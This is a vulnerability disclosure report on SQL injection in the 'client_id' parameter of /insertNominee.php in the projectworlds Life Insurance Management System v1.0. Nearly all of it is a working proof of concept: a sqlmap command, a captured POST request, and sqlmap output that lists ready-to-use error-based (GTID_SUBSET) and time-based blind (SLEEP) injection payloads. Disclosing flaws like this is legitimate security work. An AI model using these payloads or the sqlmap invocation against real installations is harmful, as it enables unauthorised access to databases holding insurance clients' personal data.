

#  SQLi vulnerability in Life Insurance Management System v1.0 of file /insertNominee.php with param 'client_id'

**vender**:

- projectworlds

**SoftLink**:

- [Life Insurance Management System in PHP | Projectworlds](https://projectworlds.in/life-insurance-management-system-in-php/)

**Vulnerable File**

- /insertNominee.php

**Version**

- V1.0

### POC

```bash
sqlmap -r request.txt -p client_id --level 5 --batch
```



```http
POST /insertNominee.php HTTP/1.1
Host: www.lims.top
Cookie: PHPSESSID=sqvuccn7rsiqr9bhq7p29tfds2
Priority: u=0, i
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Origin: http://www.lims.top
Content-Type: application/x-www-form-urlencoded
Referer: http://www.lims.top/addNominee.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Length: 90

nominee_id=3&client_id=3&name=3&sex=3&birth_date=3&nid=3&relationship=3&priority=3&phone=3
```



```
---
Parameter: client_id (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: nominee_id=3&client_id=3' AND GTID_SUBSET(CONCAT(0x716b767071,(SELECT (ELT(5284=5284,1))),0x71786a7071),5284) AND 'UGBR'='UGBR&name=3&sex=3&birth_date=3&nid=3&relationship=3&priority=3&phone=3

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: nominee_id=3&client_id=3' AND (SELECT 8478 FROM (SELECT(SLEEP(5)))Kufl) AND 'tgPh'='tgPh&name=3&sex=3&birth_date=3&nid=3&relationship=3&priority=3&phone=3
---
```




